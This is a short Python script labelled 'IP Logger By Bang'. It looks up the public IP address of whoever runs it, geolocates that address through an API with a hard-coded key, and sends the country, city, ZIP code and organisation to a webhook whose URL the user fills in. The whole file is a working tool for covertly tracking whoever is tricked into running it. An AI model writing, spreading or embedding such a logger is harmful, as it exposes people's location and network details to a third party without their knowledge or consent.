from requests import get, post
from json import loads, dumps

lien = "Put Your WebHooks Here"


ip = get("https://v4.ident.me/").text
info = loads(get(f"https://api.ipgeolocation.io/ipgeo?apiKey=ea51e6ee9beb47cdad50bec7ab6579d6&ip={ip}").text)

liste = []

for element in info:
        liste.append(element)

headers = {
    "Content-Type" : "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
}

embed = {
        "username": "IP Logger By Bang",
        "avatar_url": "https://img.20mn.fr/SjJEHpi8QSmS8EaBs76Eow/648x360_le-mythique-nyan-cat-est-mis-aux-encheres.jpg",
        "embeds": [
    {
      "title": "My Github",
      "url": "https://github.com/b4ng0x",
      "color": 0x0c0303,
      "fields": [
        {"name": "IP :", "value": info[liste[0]]},
        {"name": "Continent :","value": info[liste[2]],"inline" : True,},
        {"name": "Country : ","value": info[liste[5]],"inline" : True,},
        {"name": "City :","value": info[liste[9]],"inline" : True,},
        {"name": "ZIP Code :","value": info[liste[10]],"inline" : True,},
        {"name": "Phone :","value": info[liste[14]],"inline" : True,},
        {"name": "Organisation :","value": info[liste[19]],"inline" : True,},
      ],
      "author": {
        "name": "bang",
        "url": "https://github.com/b4ng0x",
        "icon_url": "https://images-eu.ssl-images-amazon.com/images/I/31IWVjYHy4L.png"
      },
      "footer": {
        "text": "IP Logger By Bang"
      },
      "image": {
          "url" : info[liste[17]]
      }
    }
  ]
}

post(lien, data=dumps(embed).encode("utf-8"), headers=headers)
